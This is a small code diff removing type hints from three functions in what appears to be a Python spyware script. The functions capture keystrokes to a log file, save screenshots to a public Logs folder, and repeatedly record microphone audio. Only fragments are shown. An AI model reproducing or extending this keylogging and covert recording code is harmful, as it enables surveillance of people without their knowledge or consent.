@@ -39,7 +39,7 @@ Parameters: The file path where the logs will be stored.
 Returns:    None
 ########################################################################################################################
 '''
-def LoggKeys(file_path: str):
+def LoggKeys(file_path):
     # Set the log file and format #
     logging.basicConfig(filename=f'{file_path}key_logs.txt', level=logging.DEBUG,
                         format='%(asctime)s: %(message)s')
@@ -59,7 +59,7 @@ Parameters: The file path where the logs will be stored.
 Returns:    None
 ########################################################################################################################
 '''
-def Screenshot(file_path: str):
+def Screenshot(file_path):
     # Create directory for screenshot storage #
     pathlib.Path('C:/Users/Public/Logs/Screenshots').mkdir(parents=True, exist_ok=True)
     screen_path = f'{file_path}Screenshots\\'
@@ -80,7 +80,7 @@ Parameters: The file path where the logs will be stored.
 Returns:    None
 ########################################################################################################################
 '''
-def Microphone(file_path: str):
+def Microphone(file_path):
     for x in range(0, 5):
         fs = 44100
         seconds = 60
